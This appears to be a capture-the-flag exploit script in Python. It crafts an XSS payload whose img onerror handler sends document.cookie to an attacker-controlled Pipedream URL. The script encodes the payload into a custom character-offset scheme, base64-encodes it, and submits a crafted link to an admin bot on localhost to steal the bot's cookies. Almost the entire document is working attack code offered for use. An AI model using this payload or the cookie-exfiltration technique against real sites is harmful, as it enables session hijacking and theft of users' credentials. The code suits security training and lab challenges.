import requests
import base64

botURL = "http://localhost:3000"
tohSynthURL = "http://localhost:3000"

pipedreamURL = "<YOUR_PIPEDREAM_URL>"
xssPayload = 'A' * 32 + '<img src="x.png" onerror="fetch(\'' + pipedreamURL + '/\'+document.cookie);"/>'

print(f"Payload: {xssPayload}\n")
print(f"Payload Length:{len(xssPayload)}\n")

synthData = ""
for x in xssPayload:
    char_ascii = ord(x)
    found = False
    
    offset = -27
    while offset >= -27 and offset <= 28:
        charCode = char_ascii + offset
        if 60 <= charCode <= 95:
            synthData += f"({charCode},{offset}),"
            found = True
            break
        offset += 1
    
    if not found:
        print(f"Impossibile codificare il carattere '{x}' (ASCII {char_ascii})")
        exit(1)
        
synthData = synthData.rstrip(",")
print(f"SynthData: {synthData}\n")
encoded_synthData = base64.b64encode(synthData.encode()).decode()
print(f"Base64-encoded SynthData: {encoded_synthData}\n")

r = requests.post(f"{botURL}/play", data={
    "url": f"{tohSynthURL}/?synthdata={encoded_synthData}"
})